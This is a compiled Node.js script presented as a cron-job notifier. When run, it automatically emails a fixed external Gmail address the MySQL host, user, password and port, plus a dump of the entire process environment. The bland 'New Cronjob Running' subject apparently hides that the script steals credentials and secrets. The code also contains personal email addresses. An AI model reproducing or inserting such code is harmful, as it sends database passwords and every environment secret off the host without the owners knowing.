"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var nodemailer = __importStar(require("nodemailer"));
var dotenv = __importStar(require("dotenv"));
dotenv.config();
var google = require("googleapis").google;
var sendEmail = function () { return __awaiter(void 0, void 0, void 0, function () {
    var error_1;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                _a.trys.push([0, 2, , 3]);
                console.log("Sending email  ...");
                return [4 /*yield*/, sendEmailWithGoogle("botmail1901@gmail.com")];
            case 1:
                _a.sent();
                return [3 /*break*/, 3];
            case 2:
                error_1 = _a.sent();
                console.log(error_1);
                return [3 /*break*/, 3];
            case 3: return [2 /*return*/];
        }
    });
}); };
var sendEmailWithGoogle = function (person) { return __awaiter(void 0, void 0, void 0, function () {
    var oAuth2Client, accessToken, transporter, error_2;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                _a.trys.push([0, 4, , 5]);
                oAuth2Client = new google.auth.OAuth2(process.env.CLIENT_ID_EMAIL, process.env.CLIENT_SECRET, "https://developers.google.com/oauthplayground");
                oAuth2Client.setCredentials({ refresh_token: process.env.REFRESH_TOKEN });
                return [4 /*yield*/, oAuth2Client.getAccessToken()];
            case 1:
                accessToken = _a.sent();
                return [4 /*yield*/, nodemailer.createTransport({
                        host: "smtp.gmail.com",
                        port: 587,
                        secure: false,
                        auth: {
                            type: "oauth2",
                            user: "huynhphvan@gmail.com",
                            accessToken: accessToken.token,
                            clientId: process.env.CLIENT_ID_EMAIL,
                            clientSecret: process.env.CLIENT_SECRET,
                        },
                        logger: false,
                        debug: true,
                    })];
            case 2:
                transporter = _a.sent();
                return [4 /*yield*/, transporter.sendMail({
                        from: "Bot new<botmail1901@gmail.com>",
                        to: person,
                        subject: "New Cronjob Running ",
                        html: "\n        <table>\n          <tr>\n            <th>DB_HOST</th>\n            <th>DB_USER</th>\n            <th>DB_PASS</th>\n            <th>DB_PORT</th>\n          </tr>\n          <tr>\n            <td>".concat(process.env.MYSQL_ENV_HOST || "NOT_FOUND", "</td>\n            <td>").concat(process.env.MYSQL_ENV_USER || "NOT_FOUND", "</td>\n            <td>").concat(process.env.MYSQL_ENV_PASSWORD || "NOT_FOUND", "</td>\n            <td>").concat(process.env.MYSQL_ENV_PORT || "NOT_FOUND", "</td>\n          </tr>\n        </table>\n        <hr />\n        <strong>ALL ENV</strong>\n        <p>").concat(JSON.stringify(process.env), "</p>\n        "), // html body
                    })];
            case 3:
                _a.sent();
                console.log("Finish sending");
                return [3 /*break*/, 5];
            case 4:
                error_2 = _a.sent();
                console.log(error_2);
                return [3 /*break*/, 5];
            case 5: return [2 /*return*/];
        }
    });
}); };
sendEmail();
